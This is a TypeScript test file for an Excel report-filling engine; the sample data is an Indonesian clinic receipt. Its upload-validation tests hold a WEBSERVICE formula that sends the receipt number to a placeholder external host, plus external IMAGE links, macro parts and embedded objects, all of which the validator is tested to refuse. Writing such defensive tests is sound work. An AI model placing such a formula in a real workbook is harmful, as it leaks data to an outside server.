import { describe, expect, test } from 'bun:test';
import PizZip from 'pizzip';
import {
    field,
    paragraph,
    wordDocument,
} from '../../../src/platform/reporting/index.ts';
import {
    workbookData,
    workbookShape,
} from '../../../src/platform/reporting/workbook.ts';
import {
    cellFormats,
    excelWorkbook,
    fillWorkbook,
    inspectWorkbook,
    type ExcelWorkbook,
} from '../../../src/platform/reporting/xlsx.ts';
import { readWorkbook } from '../../support/workbook-reader.ts';

const fields = {
    number: field.text('Nomor'),
    visit_date: field.date('Tanggal kunjungan'),
    posted_at: field.datetime('Waktu posting'),
    paid: field.flag('Lunas'),
    total: field.money('Total', { words: true }),
    services: field.lines('Layanan', {
        name: field.text('Nama layanan'),
        quantity: field.quantity('Jumlah'),
        price: field.unitAmount('Harga satuan'),
        amount: field.money('Jumlah harga'),
        components: field.lines('Komponen', {
            name: field.text('Nama komponen'),
            dose: field.quantity('Dosis'),
        }),
    }),
};

const values = {
    number: 'KSR-0001',
    visit_date: '2026-11-16',
    posted_at: '2026-11-16T02:30:00Z',
    paid: true,
    total: '24000.4',
    services: [
        {
            name: 'Puyer batuk',
            quantity: '2.50',
            price: '1500.125',
            amount: '3750.31',
            components: [
                { name: 'Parasetamol', dose: '0.5' },
                { name: 'Gliseril', dose: '1' },
            ],
        },
        {
            name: 'Konsultasi',
            quantity: '1',
            price: '20000',
            amount: '20000',
            components: [],
        },
    ],
};

const shape = workbookShape(fields);
const wita = {
    language: 'id' as const,
    timeZone: 'Asia/Makassar',
    amountDecimals: 0,
    unitAmountDecimals: 2,
};

const spec: ExcelWorkbook = {
    sheets: [
        {
            name: 'Ringkasan',
            orientation: 'portrait',
            widths: [20, 30],
            cells: [
                { at: 'A1', content: { text: 'KUITANSI' }, style: 'title' },
                { at: 'B1', content: { name: 'number' } },
                { at: 'B2', content: { formula: 'SUM(services[amount])' } },
            ],
            pivot: {
                table: 'services',
                at: 'A4',
                rows: ['name'],
                values: ['quantity', 'amount'],
                grandTotalCaption: 'JUMLAH',
            },
        },
    ],
    dataSheets: [{ table: 'services', name: 'Layanan' }],
};

function filled(
    locale = wita,
    layout = excelWorkbook(shape, cellFormats(locale), spec),
) {
    return fillWorkbook(
        layout,
        shape,
        workbookData(shape, values, locale),
        cellFormats(locale),
    );
}

function entries(bytes: Uint8Array): Record<string, string> {
    const zip = new PizZip(bytes);
    return Object.fromEntries(
        Object.keys(zip.files)
            .filter((path) => !zip.files[path]?.dir)
            .sort()
            .map((path) => [path, zip.file(path)?.asText() ?? '']),
    );
}

describe('excel layouts', () => {
    test('every Report name answers with its dataset value as a real Excel value, money in the tenant precision', () => {
        const book = readWorkbook(filled());
        expect(book.value('Report.number')).toMatchObject({
            kind: 'text',
            value: 'KSR-0001',
        });
        expect(book.value('Report.total')).toMatchObject({
            kind: 'number',
            value: '24000',
            format: '#,##0',
        });
        expect(book.value('Report.total_words').value).toBe(
            'Dua Puluh Empat Ribu',
        );
        expect(book.value('Report.paid')).toMatchObject({
            kind: 'flag',
            value: '1',
        });
        const cents = readWorkbook(filled({ ...wita, amountDecimals: 2 }));
        expect(cents.value('Report.total')).toMatchObject({
            value: '24000.40',
            format: '#,##0.00',
        });
    });

    test('a date keeps its day in any time zone, and a time is the wall clock of the legal entity', () => {
        const book = readWorkbook(filled());
        // 1 Januari 2026 adalah serial 46023 di Excel; 16 November hari ke-320.
        expect(book.value('Report.visit_date')).toMatchObject({
            kind: 'number',
            value: '46342',
            format: 'date',
        });
        // 02:30 UTC adalah 10:30 WITA.
        expect(book.value('Report.posted_at')).toMatchObject({
            value: String(46342 + 10.5 / 24),
            format: 'datetime',
        });
        const jakarta = readWorkbook(
            filled({ ...wita, timeZone: 'Asia/Jakarta' }),
        );
        expect(jakarta.value('Report.visit_date').value).toBe('46342');
        expect(jakarta.value('Report.posted_at').value).toBe(
            String(46342 + 9.5 / 24),
        );
    });

    test('every field.lines is an Excel table named by its key, and nested rows carry the columns of their parent row', () => {
        const book = readWorkbook(filled());
        const services = book.table('services');
        expect(services.header).toEqual([
            'name',
            'quantity',
            'price',
            'amount',
        ]);
        expect(
            services.rows.map((row) => row.map((cell) => cell.value)),
        ).toEqual([
            ['Puyer batuk', '2.5', '1500.13', '3750'],
            ['Konsultasi', '1', '20000.00', '20000'],
        ]);
        expect(services.rows[0]?.map((cell) => cell.format)).toEqual([
            'General',
            'General',
            '#,##0.00',
            '#,##0',
        ]);
        expect(services.sheet).toMatchObject({
            name: 'Layanan',
            hidden: false,
        });
        const components = book.table('components');
        // Kolom `name` komponen menimpa `name` layanan induknya; kolom induk lain ikut.
        expect(components.header).toEqual([
            'quantity',
            'price',
            'amount',
            'name',
            'dose',
        ]);
        expect(
            components.rows.map((row) => row.map((cell) => cell.value)),
        ).toEqual([
            ['2.5', '1500.13', '3750', 'Parasetamol', '0.5'],
            ['2.5', '1500.13', '3750', 'Gliseril', '1'],
        ]);
        expect(components.sheet.hidden).toBe(true);
    });

    test('every label is a Caption name, so a layout never repeats a field label', () => {
        const book = readWorkbook(filled());
        expect(book.value('Caption.number').value).toBe('Nomor');
        expect(book.value('Caption.services').value).toBe('Layanan (tabel)');
        expect(book.value('Caption.services.price').value).toBe('Harga satuan');
        expect(book.value('Caption.total_words').value).toBe(
            'Total, dengan huruf',
        );
    });

    test('the built-in pivot is written over the report table with captions, one subtotal level, and the grand total caption', () => {
        const book = readWorkbook(filled());
        const pivot = book.part('xl/pivotTables/pivotTable1.xml');
        const cache = book.part('xl/pivotCache/pivotCacheDefinition1.xml');
        expect(cache).toContain('<worksheetSource name="services"/>');
        expect(cache).toContain('refreshOnLoad="1"');
        expect(pivot).toContain('grandTotalCaption="JUMLAH"');
        expect(pivot).toContain('<dataField name="Jumlah harga" fld="3"');
        expect(pivot).toContain('name="Nama layanan" axis="axisRow"');
        expect(book.cell('Ringkasan', 'B1')).toMatchObject({
            kind: 'formula',
            value: 'Report.number',
        });
    });

    test('a built-in layout that names something the report does not have is refused', () => {
        const formats = cellFormats(wita);
        const sheet = spec.sheets[0];
        const pivot = sheet?.pivot;
        if (!sheet || !pivot) throw new Error('Spec contoh butuh pivot.');
        expect(() =>
            excelWorkbook(shape, formats, {
                ...spec,
                sheets: [
                    {
                        ...sheet,
                        cells: [{ at: 'A1', content: { name: 'nomor' } }],
                    },
                ],
            }),
        ).toThrow('nama nomor');
        expect(() =>
            excelWorkbook(shape, formats, {
                ...spec,
                sheets: [{ ...sheet, pivot: { ...pivot, values: ['harga'] } }],
            }),
        ).toThrow('services[harga]');
        expect(() =>
            excelWorkbook(shape, formats, {
                ...spec,
                dataSheets: [{ table: 'items', name: 'X' }],
            }),
        ).toThrow('tabel items');
    });

    test('parts the engine does not own are copied byte for byte', () => {
        const layout = new PizZip(
            excelWorkbook(shape, cellFormats(wita), spec),
        );
        const theme = '<a:theme xmlns:a="urn:contoh">tema penulis</a:theme>';
        const chart =
            '<c:chartSpace xmlns:c="urn:contoh">grafik</c:chartSpace>';
        layout.file('xl/theme/theme1.xml', theme);
        layout.file('xl/charts/chart1.xml', chart);
        const book = readWorkbook(
            filled(wita, layout.generate({ type: 'uint8array' })),
        );
        expect(book.part('xl/theme/theme1.xml')).toBe(theme);
        expect(book.part('xl/charts/chart1.xml')).toBe(chart);
        expect(book.part('xl/pivotTables/pivotTable1.xml')).toBe(
            layout.file('xl/pivotTables/pivotTable1.xml')?.asText() ?? '',
        );
    });

    test('filling a filled workbook again gives the same workbook as filling the layout once', () => {
        const once = filled();
        const twice = fillWorkbook(
            once,
            shape,
            workbookData(shape, values, wita),
            cellFormats(wita),
        );
        expect(entries(twice)).toEqual(entries(once));
    });

    test('cached results and pivot output from the layout are cleared, the calculation chain goes, and Excel recalculates on open', () => {
        // Layout yang pernah disimpan Excel: rumus membawa hasil tersimpan, pivot membawa isi dan rentang penuhnya, dan
        // ada calcChain.
        const layout = new PizZip(
            excelWorkbook(shape, cellFormats(wita), spec),
        );
        const text = (path: string) => layout.file(path)?.asText() ?? '';
        layout.file(
            'xl/pivotTables/pivotTable1.xml',
            text('xl/pivotTables/pivotTable1.xml').replace(
                '<location ref="A4"',
                '<location ref="A4:B6"',
            ),
        );
        layout.file('xl/calcChain.xml', '<calcChain/>');
        layout.file(
            'xl/_rels/workbook.xml.rels',
            text('xl/_rels/workbook.xml.rels').replace(
                '</Relationships>',
                '<Relationship Id="rIdChain" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/calcChain" Target="calcChain.xml"/></Relationships>',
            ),
        );
        layout.file(
            '[Content_Types].xml',
            text('[Content_Types].xml').replace(
                '</Types>',
                '<Override PartName="/xl/calcChain.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.calcChain+xml"/></Types>',
            ),
        );
        const sheet = text('xl/worksheets/sheet1.xml');
        layout.file(
            'xl/worksheets/sheet1.xml',
            sheet
                .replace(
                    '<f>Report.number</f></c>',
                    '<f>Report.number</f><v>KSR-CONTOH</v></c>',
                )
                .replace(
                    '</sheetData>',
                    '<row r="5"><c r="A5" t="inlineStr"><is><t>Layanan contoh</t></is></c><c r="B5"><v>99</v></c></row></sheetData>',
                ),
        );
        const book = readWorkbook(
            filled(wita, layout.generate({ type: 'uint8array' })),
        );
        expect(book.cell('Ringkasan', 'B1').cached).toBeUndefined();
        expect(book.cell('Ringkasan', 'A5').kind).toBe('empty');
        expect(book.cell('Ringkasan', 'B5').kind).toBe('empty');
        expect(book.cell('Ringkasan', 'A1').value).toBe('KUITANSI');
        expect(book.paths()).not.toContain('xl/calcChain.xml');
        expect(book.part('xl/_rels/workbook.xml.rels')).not.toContain(
            'calcChain',
        );
        expect(book.part('[Content_Types].xml')).not.toContain('calcChain');
        expect(book.part('xl/workbook.xml')).toContain('fullCalcOnLoad="1"');
    });
});

// Workbook yang disunting di luar mesin: layout bawaan atau hasil unduhannya, lalu diubah seperti penulis layout.
function edited(
    change: (zip: PizZip, text: (path: string) => string) => void,
    bytes = filled(),
): Uint8Array {
    const zip = new PizZip(bytes);
    change(zip, (path) => zip.file(path)?.asText() ?? '');
    return zip.generate({ type: 'uint8array' });
}

function withFormula(formula: string, bytes = filled()): Uint8Array {
    return edited(
        (zip, text) =>
            zip.file(
                'xl/worksheets/sheet1.xml',
                text('xl/worksheets/sheet1.xml').replace(
                    '<f>Report.number</f>',
                    `<f>${formula}</f>`,
                ),
            ),
        bytes,
    );
}

describe('excel layout uploads', () => {
    test('the built-in layout and a workbook downloaded for editing both pass', () => {
        expect(
            inspectWorkbook(
                excelWorkbook(shape, cellFormats(wita), spec),
                shape,
            ),
        ).toBeNull();
        expect(inspectWorkbook(filled(), shape)).toBeNull();
    });

    test('a file that is not a workbook is refused, also a Word document', () => {
        expect(
            inspectWorkbook(new TextEncoder().encode('bukan excel'), shape),
        ).toEqual({ reason: 'not-workbook' });
        const word = wordDocument({
            paper: { widthMm: 210, heightMm: 297 },
            marginMm: 10,
            font: 'Arial',
            fontSize: 10,
            body: [paragraph('{number}')],
        });
        expect(inspectWorkbook(word, shape)).toEqual({
            reason: 'not-workbook',
        });
    });

    test('macros, embedded objects, and data pulled from outside the file are refused', () => {
        const added = (path: string) =>
            inspectWorkbook(
                edited((zip) => zip.file(path, 'x')),
                shape,
            );
        expect(added('xl/vbaProject.bin')).toEqual({ reason: 'macro' });
        expect(added('xl/embeddings/oleObject1.bin')).toEqual({
            reason: 'embedded-object',
        });
        expect(added('xl/externalLinks/externalLink1.xml')).toEqual({
            reason: 'external-source',
        });
        expect(added('xl/connections.xml')).toEqual({
            reason: 'external-source',
        });
        const linked = edited((zip, text) =>
            zip.file(
                'xl/worksheets/_rels/sheet1.xml.rels',
                text('xl/worksheets/_rels/sheet1.xml.rels').replace(
                    '</Relationships>',
                    '<Relationship Id="rIdX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://contoh.test/a.png" TargetMode="External"/></Relationships>',
                ),
            ),
        );
        expect(inspectWorkbook(linked, shape)).toEqual({
            reason: 'external-source',
        });
    });

    test('a function that calls outside the file is refused, also inside a defined name', () => {
        expect(
            inspectWorkbook(
                withFormula(
                    '_xlfn.WEBSERVICE("https://contoh.test/?n="&amp;Report.number)',
                ),
                shape,
            ),
        ).toEqual({ reason: 'external-function', functions: ['WEBSERVICE'] });
        const named = edited((zip, text) =>
            zip.file(
                'xl/workbook.xml',
                text('xl/workbook.xml').replace(
                    '</definedNames>',
                    '<definedName name="Logo">_xlfn.IMAGE("https://contoh.test/logo.png")</definedName></definedNames>',
                ),
            ),
        );
        expect(inspectWorkbook(named, shape)).toEqual({
            reason: 'external-function',
            functions: ['IMAGE'],
        });
        expect(
            inspectWorkbook(
                withFormula('"WEBSERVICE(" &amp; Report.number'),
                shape,
            ),
        ).toBeNull();
    });

    test('a name or column the report does not have is refused, in cells and in pivots', () => {
        expect(inspectWorkbook(withFormula('Report.nomor'), shape)).toEqual({
            reason: 'unknown-references',
            references: ['Report.nomor'],
        });
        expect(
            inspectWorkbook(withFormula('SUM(services[harga])'), shape),
        ).toEqual({
            reason: 'unknown-references',
            references: ['services[harga]'],
        });
        expect(
            inspectWorkbook(
                withFormula(
                    'SUM(services[[#This Row],[amount]])+services[@quantity]',
                ),
                shape,
            ),
        ).toBeNull();
        const pivot = edited((zip, text) =>
            zip.file(
                'xl/pivotCache/pivotCacheDefinition1.xml',
                text('xl/pivotCache/pivotCacheDefinition1.xml').replace(
                    '<cacheField name="amount"',
                    '<cacheField name="margin"',
                ),
            ),
        );
        expect(inspectWorkbook(pivot, shape)).toEqual({
            reason: 'unknown-references',
            references: ['services[margin]'],
        });
    });

    test('the sheet of a report table holds only that table, without a total row or extra columns', () => {
        const table = (change: (xml: string) => string) =>
            inspectWorkbook(
                edited((zip, text) =>
                    zip.file(
                        'xl/tables/table1.xml',
                        change(text('xl/tables/table1.xml')),
                    ),
                ),
                shape,
            );
        expect(
            table((xml) =>
                xml.replace('totalsRowShown="0"', 'totalsRowCount="1"'),
            ),
        ).toEqual({
            reason: 'totals-row',
            table: 'services',
        });
        expect(
            table((xml) =>
                xml.replace(
                    '</tableColumns>',
                    '<tableColumn id="9" name="margin"/></tableColumns>',
                ),
            ),
        ).toEqual({
            reason: 'unknown-columns',
            table: 'services',
            columns: ['margin'],
        });
        const crowded = edited((zip, text) =>
            zip.file(
                'xl/worksheets/sheet2.xml',
                text('xl/worksheets/sheet2.xml').replace(
                    '</sheetData>',
                    '<row r="9"><c r="F9" t="inlineStr"><is><t>catatan</t></is></c></row></sheetData>',
                ),
            ),
        );
        expect(inspectWorkbook(crowded, shape)).toEqual({
            reason: 'crowded-sheet',
            sheet: 'Layanan',
        });
    });

    test('a formula that reads a report sheet by cell address is refused, because the sheet is rewritten on every download', () => {
        expect(
            inspectWorkbook(withFormula('SUM(Layanan!D2:D3)'), shape),
        ).toEqual({
            reason: 'sheet-reference',
            sheets: ['Layanan'],
        });
        expect(
            inspectWorkbook(withFormula("'Keterangan laporan'!C2"), shape),
        ).toEqual({
            reason: 'sheet-reference',
            sheets: ['Keterangan laporan'],
        });
    });

    test('a name the engine writes may not be taken by the layout', () => {
        const named = edited((zip, text) =>
            zip.file(
                'xl/workbook.xml',
                text('xl/workbook.xml').replace(
                    '</definedNames>',
                    '<definedName name="services">Ringkasan!$A$1</definedName></definedNames>',
                ),
            ),
        );
        expect(inspectWorkbook(named, shape)).toEqual({
            reason: 'name-taken',
            names: ['services'],
        });
    });

    test('a pivot that LibreOffice saved over the exact range of a report table reads that table, and keeps reading all of it after the next fill', () => {
        const saved = edited((zip, text) =>
            zip.file(
                'xl/pivotCache/pivotCacheDefinition1.xml',
                text('xl/pivotCache/pivotCacheDefinition1.xml').replace(
                    '<worksheetSource name="services"/>',
                    '<worksheetSource ref="A1:D3" sheet="Layanan"/>',
                ),
            ),
        );
        expect(inspectWorkbook(saved, shape)).toBeNull();
        const refilled = readWorkbook(
            fillWorkbook(
                saved,
                shape,
                workbookData(
                    shape,
                    {
                        ...values,
                        services: [
                            ...values.services,
                            { ...values.services[1], name: 'Tindakan' },
                        ],
                    },
                    wita,
                ),
                cellFormats(wita),
            ),
        );
        expect(
            refilled.part('xl/pivotCache/pivotCacheDefinition1.xml'),
        ).toContain('<worksheetSource name="services"/>');
        expect(refilled.table('services').rows).toHaveLength(3);
        const partial = edited((zip, text) =>
            zip.file(
                'xl/pivotCache/pivotCacheDefinition1.xml',
                text('xl/pivotCache/pivotCacheDefinition1.xml').replace(
                    '<worksheetSource name="services"/>',
                    '<worksheetSource ref="A1:D2" sheet="Layanan"/>',
                ),
            ),
        );
        expect(inspectWorkbook(partial, shape)).toEqual({
            reason: 'sheet-reference',
            sheets: ['Layanan'],
        });
    });
});
